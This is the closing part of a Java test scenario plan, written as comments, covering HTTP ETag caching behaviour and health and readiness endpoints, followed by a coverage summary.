    /** Scenario 109: Caching & ETag */
    /** Step 1 GET returns ETag header → present */
    /** Step 2 GET with If-None-Match matching ETag → 304 Not Modified */
    /** Step 3 GET with If-None-Match non-matching → 200 OK */
    /** Step 4 PUT with If-Match stale ETag → 412 Precondition Failed */

    /** Scenario 110: Health & readiness */
    /** Step 1 GET /health → 200 OK with no auth required */
    /** Step 2 GET /readiness → 200 when DB reachable, 503 when not */
    /** Step 3 Health endpoint does not leak version, dependencies, or stack */

    // ========================================================================
    //  END OF TEST SCENARIO PLAN
    //  ---------------------------------------------------------------------
    //  Coverage summary:
    //    - 110 scenarios, ~700 individual steps
    //    - Maps to RBAC test plan (User / Employer / Staff / Security / Optional)
    //    - Maps to BadDummyData.java fixtures (every category covered)
    //    - Use BadDummyData.getEverythingBadEverywhere(...) to drive Sections D–E
    // ========================================================================
}